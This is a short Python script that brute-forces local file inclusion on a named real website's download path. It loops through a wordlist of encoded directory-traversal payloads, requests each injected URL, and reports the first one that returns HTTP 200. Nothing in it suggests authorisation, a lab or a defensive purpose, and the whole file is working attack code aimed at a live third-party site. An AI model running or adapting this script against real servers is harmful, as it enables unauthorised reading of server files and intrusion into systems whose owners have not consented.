#https://kpolyakov.spb.ru/download/
import requests


# [LFI]
url = 'https://kpolyakov.spb.ru/download[LFI]'

with open('traversals-8-deep-exotic-encoding.txt', 'r') as f:
    for line in f.readlines():
        payload = line.strip()
        url_with_payload = url.replace('[LFI]', payload)
        r = requests.get(url_with_payload)
        if r.status_code == 200:
            print(f'Len: {len(r.content)}; Found: {payload}; Code: {r.status_code}; LINK {url+payload}')
            break
        else:
            print(f'Len: {len(r.content)}; Not found: {payload}; Code: {r.status_code}; ')
